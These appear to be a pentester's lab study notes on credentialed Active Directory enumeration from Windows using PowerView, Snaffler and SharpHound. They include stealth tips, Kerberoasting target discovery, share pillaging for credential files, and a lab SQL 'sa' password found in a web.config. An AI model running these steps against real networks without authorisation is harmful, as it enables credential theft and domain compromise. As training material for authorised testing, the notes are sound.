# Section 15 — Credentialed Enumeration from Windows

## Tools Covered
- ActiveDirectory PowerShell Module (built-in, stealthy)
- PowerView (PowerSploit)
- SharpView (.NET port of PowerView)
- Snaffler (share pillaging)
- SharpHound (BloodHound Windows collector)

---

## ActiveDirectory PowerShell Module

Built-in, stealthier than dropping tools — blends with normal admin activity.

```powershell
# Check/import module
Get-Module
Import-Module ActiveDirectory

# Domain info (SID, functional level, child domains, FSMO roles)
Get-ADDomain

# Find Kerberoastable accounts (SPN set)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Domain trusts
Get-ADTrust -Filter *

# All groups
Get-ADGroup -Filter * | select name

# Specific group info
Get-ADGroup -Identity "Backup Operators"

# Group members
Get-ADGroupMember -Identity "Backup Operators"
```

**What to look for:**
- `ChildDomains` → child domains to pivot into
- Trusts → `BiDirectional` + `ForestTransitive` = cross-forest attack potential
- `Backup Operators` members → can backup/restore DC files → path to domain compromise
- SPN accounts → Kerberoasting targets

---

## PowerView

```powershell
# Import
Import-Module .\PowerView.ps1
# or dot-source
. .\PowerView.ps1
```

### Key Functions

```powershell
# Domain info
Get-Domain
Get-DomainController

# User enumeration
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object name,samaccountname,description,memberof,admincount,useraccountcontrol,serviceprincipalname

# Kerberoastable users (SPN set)
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

# Group membership (recursive — catches nested DAs)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Trust mapping
Get-DomainTrustMapping

# Test local admin access on a host
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

# Find where users are logged in
Find-DomainUserLocation

# Find shares
Find-DomainShare

# Find interesting files on shares
Find-InterestingDomainShareFile

# Find local admin access across domain
Find-LocalAdminAccess

# ACL misconfigurations
Find-InterestingDomainAcl
```

### Key PowerView Fields to Note
| Field | Significance |
|-------|-------------|
| `admincount: 1` | Protected account (AdminSDHolder) — was/is privileged |
| `DONT_REQ_PREAUTH` | AS-REP roastable |
| `ServicePrincipalName` set | Kerberoastable |
| `memberof` | Group memberships — check for nested DA access |

---

## SharpView (.NET port of PowerView)

Use when PowerShell is blocked/constrained — same functions, C# binary.

```powershell
# Help for any function
.\SharpView.exe Get-DomainUser -Help

# Enumerate a user
.\SharpView.exe Get-DomainUser -Identity forend

# Same PowerView functions available — just prefix with .\SharpView.exe
```

---

## Snaffler (Share Pillaging)

Enumerates all domain hosts → finds readable shares → hunts for sensitive files automatically.

```powershell
# Run and output to log (recommended — lots of output)
.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

| Flag | Meaning |
|------|---------|
| `-s` | Print results to console |
| `-d` | Domain to search |
| `-o` | Output log file |
| `-v data` | Verbosity — data shows only findings |

**Color coding:**
- `{Red}` = high interest (keys, dumps, credentials)
- `{Black}` = interesting (password managers, config files)
- `{Green}` = accessible share

**What it finds:**
- `.key`, `.keypair`, `.keychain` — private keys
- `.kdb`, `.kwallet` — password manager databases
- `.sqldump`, `.mdf` — database files
- `.ppk` — PuTTY private keys
- Config files with hardcoded credentials

---

## SharpHound (Windows BloodHound Collector)

```powershell
# Collect everything, zip output
.\SharpHound.exe -c All --zipfilename ILFREIGHT

# Stealth mode (DC-only, no computer connections)
.\SharpHound.exe -c DCOnly --zipfilename ILFREIGHT_stealth

# Specific domain
.\SharpHound.exe -c All -d inlanefreight.local --zipfilename ILFREIGHT
```

Upload zip to BloodHound GUI → Upload Data button → select zip.

---

## BloodHound GUI — Key Queries

```
Analysis Tab → Pre-built Queries:

Find Shortest Paths To Domain Admins
Find All Domain Admins
Find Computers with Unsupported Operating Systems   ← legacy hosts (EternalBlue candidates)
Find Computers where Domain Users are Local Admin   ← any compromised user = access
Find Principals with DCSync Rights
Find AS-REP Roastable Users
Find Kerberoastable Users
```

**Useful node searches:**
- Search `domain:` → click domain node → Node Info → forest/trust overview
- Search specific user → Node Info → group memberships, sessions, reachable targets

---

## Inlanefreight Trust Map

From `Get-ADTrust -Filter *`:
| Source | Target | Type | Direction |
|--------|--------|------|-----------|
| INLANEFREIGHT.LOCAL | LOGISTICS.INLANEFREIGHT.LOCAL | Within forest | Bidirectional |
| INLANEFREIGHT.LOCAL | FREIGHTLOGISTICS.LOCAL | Forest transitive | Bidirectional |

`ForestTransitive: True` + `Bidirectional` = cross-forest attack potential

---

## Windows Enumeration Workflow

```powershell
# 1. Import AD module (built-in, stealthy)
Import-Module ActiveDirectory
Get-ADDomain
Get-ADTrust -Filter *

# 2. PowerView — detailed enumeration
Import-Module .\PowerView.ps1
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
Test-AdminAccess -ComputerName TARGET
Find-DomainUserLocation

# 3. Snaffler — share pillaging
.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data

# 4. SharpHound — BloodHound collection
.\SharpHound.exe -c All --zipfilename ILFREIGHT
# → Upload to BloodHound GUI
```

---

## Lab Findings

### BloodHound — Kerberoastable Accounts
- Collected with SharpHound (`.\SharpHound.exe -c All --zipfilename ILFREIGHT`) → 3809 objects
- Uploaded zip to BloodHound GUI → Analysis → "List All Kerberoastable Accounts"
- **Result: 13 Kerberoastable accounts in INLANEFREIGHT.LOCAL**

### Snaffler — web.config credentials
Found via `.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data`:

```
{Red} \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\web.config
connectionString="server=ACADEMY-EA-DB01;database=Employees;uid=sa;password=ILFREIGHTDB01!;"
```

- **Username:** `sa`
- **Password:** `ILFREIGHTDB01!`
- **Server:** ACADEMY-EA-DB01 (SQL server)

---

## Exam Notes

- AD PowerShell module = stealthy, built-in, no tools needed
- PowerView `-Recurse` on group membership = catches nested DAs that simple enumeration misses
- SharpView = use when PS is constrained/blocked (C# binary)
- Snaffler Red findings = investigate immediately (keys, dumps, credentials)
- BloodHound "Find Computers where Domain Users are Local Admin" = instant lateral movement if found
- "Unsupported Operating Systems" query = identify EternalBlue / MS08-067 candidates
- Document every tool transferred to/from hosts for deconfliction with client
- Clean up tools at end of engagement
